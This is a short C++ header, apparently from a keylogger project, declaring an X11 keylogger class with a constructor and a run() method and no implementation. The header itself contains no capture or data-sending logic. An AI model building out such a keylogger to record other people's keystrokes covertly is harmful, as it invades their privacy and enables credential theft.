#ifndef KEYLOGGER_X11_H
#define KEYLOGGER_X11_H

#include "keylogger.h"

class Keylogger_x11 : public Keylogger
{
public:
    Keylogger_x11();
    void run();
};

#endif // KEYLOGGER_X11_H
